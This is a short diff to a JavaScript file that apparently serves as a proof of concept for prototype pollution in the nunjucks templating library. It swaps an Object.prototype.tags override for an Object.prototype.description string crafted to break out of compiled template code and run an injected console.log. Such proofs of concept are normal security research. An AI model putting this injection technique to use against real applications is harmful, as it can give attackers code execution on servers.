@@ -1,9 +1,7 @@
 const nunjucks = require('nunjucks');
 
-Object.prototype.tags = {
-    blockStart: "<p>{{",
-    blockEnd: "}}</p>",
-}
+// title, items will also work
+Object.prototype.description = "undefined, undefined)\nconsole.log('gg')//"
 
 // Define your template data
 let templateData = {
@@ -29,5 +27,3 @@ let template = nunjucks.compile(`
 
 // Render the template with the data
 let output = template.render(templateData);
-
-console.log(output);
